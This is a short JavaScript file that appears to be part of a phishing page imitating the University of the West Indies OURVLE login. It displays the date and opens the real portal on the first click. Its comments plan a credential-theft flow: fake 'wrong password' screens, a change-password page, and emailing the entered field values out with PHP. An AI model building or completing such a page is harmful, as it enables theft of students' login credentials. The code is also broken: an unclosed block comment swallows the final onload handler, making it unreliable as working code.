function getDate(){
const monthNames = ["January", "February", "March", "April", "May", "June",
"July", "August", "September", "October", "November", "December"];

const dayNames = ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"];

 let d = new Date();
 document.getElementById("currentDate").innerHTML= dayNames[d.getDay()] + " " + d.getDate()
  + " " + monthNames[d.getMonth()] + " " + d.getFullYear();
}

let clicked = 0;
document.onclick = function(){
    if (clicked === 0){
    window.open("https://ourvle.mona.uwi.edu/", "Goolge");
    clicked = 1;
    }
}

//step 1
/*alert wrong password when submit is clicked once
-display wrong password scren
-go to change pw page when submit === clicked
-send field values to email w/ PHP












window.onload = () =>{
    getDate();
}